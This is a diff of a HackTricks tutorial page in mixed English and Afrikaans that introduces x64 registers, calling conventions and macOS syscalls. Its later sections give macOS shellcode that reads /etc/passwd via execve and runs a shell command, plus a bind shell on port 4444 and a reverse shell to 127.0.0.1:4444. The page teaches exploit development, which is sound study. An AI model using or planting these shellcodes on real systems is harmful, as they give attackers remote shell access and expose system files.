@@ -1,86 +1,88 @@
-# Inleiding tot x64
+# Introduction to x64
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## **Inleiding tot x64**
+## **Introduction to x64**
 
-x64, ook bekend as x86-64, is 'n 64-bis-processorargitektuur wat hoofsaaklik in tafelrekenaars en bedienerberekening gebruik word. Afkomstig van die x86-argitektuur wat deur Intel vervaardig is en later deur AMD met die naam AMD64 aangeneem is, is dit die heersende argitektuur in persoonlike rekenaars en bedieners vandag.
+x64, ook bekend as x86-64, is 'n 64-bis verwerker argitektuur wat hoofsaaklik in lessenaar en bediener rekenaars gebruik word. Dit het ontstaan uit die x86 argitektuur wat deur Intel vervaardig is en later deur AMD met die naam AMD64 aangeneem is, en dit is die heersende argitektuur in persoonlike rekenaars en bedieners vandag.
 
 ### **Registers**
 
-x64 bou voort op die x86-argitektuur, met **16 algemene doelregisters** wat geëtiketteer is as `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, en `r8` tot `r15`. Elkeen hiervan kan 'n **64-bis** (8-byte) waarde stoor. Hierdie registers het ook 32-bis, 16-bis, en 8-bis subregisters vir verenigbaarheid en spesifieke take.
+x64 brei op die x86 argitektuur uit, met **16 algemene registers** gemerk as `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, en `r8` tot `r15`. Elke een van hierdie kan 'n **64-bis** (8-byt) waarde stoor. Hierdie registers het ook 32-bis, 16-bis, en 8-bis sub-registers vir kompatibiliteit en spesifieke take.
 
-1. **`rax`** - Tradisioneel gebruik vir **terugkeerwaardes** van funksies.
-2. **`rbx`** - Dikwels gebruik as 'n **basisregister** vir geheue-operasies.
-3. **`rcx`** - Gewoonlik gebruik vir **lusstellers**.
-4. **`rdx`** - Gebruik in verskeie rolle, insluitend uitgebreide wiskundige operasies.
-5. **`rbp`** - **Basewysiger** vir die stapelraamwerk.
-6. **`rsp`** - **Stapelwysiger**, hou by die boonste van die stapel.
-7. **`rsi`** en **`rdi`** - Gebruik vir **bron** en **bestemming** indekse in string/geheue-operasies.
-8. **`r8`** tot **`r15`** - Addisionele algemene doelregisters wat in x64 ingevoer is.
+1. **`rax`** - Tradisioneel gebruik vir **terugwaardes** van funksies.
+2. **`rbx`** - Gereeld gebruik as 'n **basisregister** vir geheue operasies.
+3. **`rcx`** - Gewoonlik gebruik vir **lus tellers**.
+4. **`rdx`** - Gebruik in verskeie rolle insluitend uitgebreide aritmetiese operasies.
+5. **`rbp`** - **Basisaanwyser** vir die stapelraam.
+6. **`rsp`** - **Stapelaanwyser**, wat die bokant van die stapel dop hou.
+7. **`rsi`** en **`rdi`** - Gebruik vir **bron** en **bestemming** indekse in string/geheue operasies.
+8. **`r8`** tot **`r15`** - Bykomende algemene registers wat in x64 bekendgestel is.
 
-### **Oproepkonvensie**
+### **Calling Convention**
 
-Die x64-oproepkonvensie verskil tussen bedryfstelsels. Byvoorbeeld:
+Die x64 aanroep konvensie verskil tussen bedryfstelsels. Byvoorbeeld:
 
-* **Windows**: Die eerste **vier parameters** word oorgedra in die registers **`rcx`**, **`rdx`**, **`r8`**, en **`r9`**. Verdere parameters word op die stapel gedruk. Die terugkeerwaarde is in **`rax`**.
-* **System V (gewoonlik gebruik in UNIX-soortgelyke stelsels)**: Die eerste **ses heelgetal- of wysigerparameters** word oorgedra in die registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, en **`r9`**. Die terugkeerwaarde is ook in **`rax`**.
+* **Windows**: Die eerste **vier parameters** word in die registers **`rcx`**, **`rdx`**, **`r8`**, en **`r9`** oorgedra. Verdere parameters word op die stapel geplaas. Die terugwaarde is in **`rax`**.
+* **System V (gewoonlik gebruik in UNIX-agtige stelsels)**: Die eerste **ses heelgetal of aanwyser parameters** word in registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, en **`r9`** oorgedra. Die terugwaarde is ook in **`rax`**.
 
-As die funksie meer as ses insette het, sal die **res op die stapel oorgedra word**. **RSP**, die stapelwysiger, moet **16 byte uitgelyn** wees, wat beteken dat die adres waarna dit wys, deur 16 deelbaar moet wees voordat enige oproep plaasvind. Dit beteken dat ons normaalweg moet verseker dat RSP behoorlik uitgelyn is in ons shellkode voordat ons 'n funksieoproep maak. Tog werk stelseloproepe baie kere selfs as hierdie vereiste nie nagekom word nie.
+As die funksie meer as ses invoere het, sal die **oorige op die stapel oorgedra word**. **RSP**, die stapelaanwyser, moet **16 bytes geallineer** wees, wat beteken dat die adres waarna dit verwys deelbaar moet wees deur 16 voordat enige aanroep plaasvind. Dit beteken dat ons normaalweg moet verseker dat RSP behoorlik geallineer is in ons shellcode voordat ons 'n funksie aanroep. In praktyk werk stelselaanroepe egter baie keer selfs al word hierdie vereiste nie nagekom nie.
 
-### Oproepkonvensie in Swift
+### Calling Convention in Swift
 
-Swift het sy eie **oproepkonvensie** wat gevind kan word op [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
+Swift het sy eie **aanroep konvensie** wat gevind kan word in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
 
-### **Gewone Instruksies**
+### **Common Instructions**
 
-x64-instruksies het 'n ryk stel, wat verenigbaarheid met vroeëre x86-instruksies handhaaf en nuwe introduceer.
+x64 instruksies het 'n ryk stel, wat kompatibiliteit met vroeëre x86 instruksies handhaaf en nuwe bekendstel.
 
-* **`mov`**: **Skuif** 'n waarde van een **register** of **geheueplek** na 'n ander.
-* Voorbeeld: `mov rax, rbx` — Skuif die waarde van `rbx` na `rax`.
-* **`push`** en **`pop`**: Druk waardes na/druk waardes van die **stapel**.
-* Voorbeeld: `push rax` — Druk die waarde in `rax` na die stapel.
-* Voorbeeld: `pop rax` — Druk die boonste waarde van die stapel na `rax`.
-* **`add`** en **`sub`**: **Byvoeging** en **aftrekking** operasies.
-* Voorbeeld: `add rax, rcx` — Tel die waardes in `rax` en `rcx` op en stoor die resultaat in `rax`.
-* **`mul`** en **`div`**: **Vermenigvuldiging** en **deling** operasies. Let op: hierdie het spesifieke gedrag met betrekking tot operandgebruik.
-* **`call`** en **`ret`**: Gebruik om funksies te **oproep** en **terug te keer**.
-* **`int`**: Gebruik om 'n sagteware **onderbreking** te veroorsaak. Byvoorbeeld, `int 0x80` is gebruik vir stelseloproepe in 32-bis x86 Linux.
-* **`cmp`**: **Vergelyk** twee waardes en stel die CPU se vlae in op grond van die resultaat.
+* **`mov`**: **Beweeg** 'n waarde van een **register** of **geheue ligging** na 'n ander.
+* Voorbeeld: `mov rax, rbx` — Beweeg die waarde van `rbx` na `rax`.
+* **`push`** en **`pop`**: Druk of pop waardes na/vanaf die **stapel**.
+* Voorbeeld: `push rax` — Druk die waarde in `rax` op die stapel.
+* Voorbeeld: `pop rax` — Pop die boonste waarde van die stapel in `rax`.
+* **`add`** en **`sub`**: **Optelling** en **aftrekking** operasies.
+* Voorbeeld: `add rax, rcx` — Voeg die waardes in `rax` en `rcx` by en stoor die resultaat in `rax`.
+* **`mul`** en **`div`**: **Vermenigvuldiging** en **deling** operasies. Let op: hierdie het spesifieke gedrag rakende operand gebruik.
+* **`call`** en **`ret`**: Gebruik om **aan te roep** en **terug te keer van funksies**.
+* **`int`**: Gebruik om 'n sagteware **onderbreking** te aktiveer. Byvoorbeeld, `int 0x80` is gebruik vir stelselaanroepe in 32-bis x86 Linux.
+* **`cmp`**: **Vergelyk** twee waardes en stel die CPU se vlae op grond van die resultaat.
 * Voorbeeld: `cmp rax, rdx` — Vergelyk `rax` met `rdx`.
-* **`je`, `jne`, `jl`, `jge`, ...**: **Kondisionele sprong** instruksies wat beheervloei verander op grond van die resultate van 'n vorige `cmp` of toets.
+* **`je`, `jne`, `jl`, `jge`, ...**: **Voorwaardelike sprong** instruksies wat die beheerstroom verander op grond van die resultate van 'n vorige `cmp` of toets.
 * Voorbeeld: Na 'n `cmp rax, rdx` instruksie, `je label` — Spring na `label` as `rax` gelyk is aan `rdx`.
-* **`syscall`**: Gebruik vir **stelseloproepe** in sommige x64-stelsels (soos moderne Unix).
-* **`sysenter`**: 'n Geoptimeerde **stelseloproep** instruksie op sommige platforms.
+* **`syscall`**: Gebruik vir **stelselaanroepe** in sommige x64 stelsels (soos moderne Unix).
+* **`sysenter`**: 'n Geoptimaliseerde **stelselaanroep** instruksie op sommige platforms.
 
-### **Funksie Proloog**
+### **Function Prologue**
 
-1. **Druk die ou basiswysiger**: `push rbp` (stoor die aanroeper se basiswysiger)
-2. **Skuif die huidige stapelwysiger na die basiswysiger**: `mov rbp, rsp` (stel die nuwe basiswysiger vir die huidige funksie op)
-3. **Ken ruimte op die stapel toe vir plaaslike veranderlikes**: `sub rsp, <grootte>` (waar `<grootte>` die aantal benodigde bytes is)
+1. **Druk die ou basisaanwyser**: `push rbp` (stoor die oproeper se basisaanwyser)
+2. **Beweeg die huidige stapelaanwyser na die basisaanwyser**: `mov rbp, rsp` (stel die nuwe basisaanwyser op vir die huidige funksie)
+3. **Allokeer ruimte op die stapel vir plaaslike veranderlikes**: `sub rsp, <size>` (waar `<size>` die aantal bytes is wat benodig word)
 
-### **Funksie Epiloog**
+### **Function Epilogue**
 
-1. **Skuif die huidige basiswysiger na die stapelwysiger**: `mov rsp, rbp` (onttrek plaaslike veranderlikes)
-2. **Druk die ou basiswysiger van die stapel af**: `pop rbp` (herstel die aanroeper se basiswysiger)
-3. **Keer terug**: `ret` (gee beheer terug aan die aanroeper)
+1. **Beweeg die huidige basisaanwyser na die stapelaanwyser**: `mov rsp, rbp` (deallokeer plaaslike veranderlikes)
+2. **Pop die ou basisaanwyser van die stapel**: `pop rbp` (herstel die oproeper se basisaanwyser)
+3. **Terugkeer**: `ret` (gee beheer terug aan die oproeper)
+
 ## macOS
 
 ### syscalls
 
-Daar is verskillende klasse van syscalls, jy kan hulle [**hier vind**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+Daar is verskillende klasse van syscalls, jy kan [**dit hier vind**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -89,7 +91,7 @@ Daar is verskillende klasse van syscalls, jy kan hulle [**hier vind**](https://o
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-Dan kan jy elke syscall nommer [**in hierdie url**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+Dan kan jy elke syscall nommer [**in hierdie URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -106,11 +108,11 @@ Dan kan jy elke syscall nommer [**in hierdie url**](https://opensource.apple.com
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-Dus om die `open` syscall (**5**) van die **Unix/BSD-klas** te roep, moet jy dit byvoeg: `0x2000000`
+So om die `open` syscall (**5**) van die **Unix/BSD klas** aan te roep, moet jy dit byvoeg: `0x2000000`
 
-Dus sal die syscall-nommer om open te roep `0x2000005` wees
+So, die syscall nommer om open aan te roep, sou `0x2000005` wees
 
-### Shellkodes
+### Shellcodes
 
 Om te kompileer:
 
@@ -137,7 +139,7 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 
 <details>
 
-<summary>C-kode om die shellkode te toets</summary>
+<summary>C kode om die shellcode te toets</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -185,9 +187,9 @@ return 0;
 ```
 </details>
 
-#### Skul
+#### Shell
 
-Geneem van [**hier**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) en verduidelik.
+Geneem uit [**hier**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) en verduidelik.
 
 {% tabs %}
 {% tab title="met adr" %}
@@ -226,9 +228,9 @@ syscall
 {% endtab %}
 {% endtabs %}
 
-#### Lees met kat
+#### Lees met cat
 
-Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus die tweede argument (x1) is 'n reeks van parameters (wat in die geheue beteken dat dit 'n stapel van die adresse is).
+Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, so die tweede argument (x1) is 'n array van parameters (wat in geheue beteken 'n stapel van die adresse).
 ```armasm
 bits 64
 section .text
@@ -259,7 +261,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### Roep bevel met sh op
+#### Roep opdrag met sh
 ```armasm
 bits 64
 section .text
@@ -297,9 +299,9 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### Bind skul
+#### Bind shell
 
-Bind skul van [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **poort 4444**
+Bind shell van [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **poort 4444**
 ```armasm
 section .text
 global _main
@@ -374,9 +376,9 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### Terugskulp
+#### Reverse Shell
 
-Terugskulp van [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Terugskulp na **127.0.0.1:4444**
+Reverse shell van [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell na **127.0.0.1:4444**
 ```armasm
 section .text
 global _main
@@ -438,16 +440,17 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
